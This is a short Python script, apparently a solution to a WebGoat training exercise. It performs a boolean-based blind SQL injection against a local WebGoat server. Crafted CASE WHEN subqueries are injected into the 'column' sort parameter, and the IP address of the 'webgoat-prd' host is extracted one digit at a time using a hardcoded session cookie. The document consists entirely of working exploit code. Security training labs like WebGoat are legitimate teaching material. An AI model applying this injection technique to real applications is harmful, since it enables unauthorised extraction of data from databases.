import requests

url = "http://localhost:8080/WebGoat/SqlInjection/servers"
cookie = {"JSESSIONID":"D56958EA062723E57B43B4212CAC20DB"}
ip = ''


for i in range(1,4):
	for j in range(0,10):
		param = {"column":"(case when exists(select hostname from servers where hostname='webgoat-prd' and substring(ip,{},1)={}) then ip else status end)".format(i,j)}
		r = requests.get(url, cookies=cookie,params=param)
		if ('2' == r.content.decode()[15]):
			ip += str(j)
			print(ip)

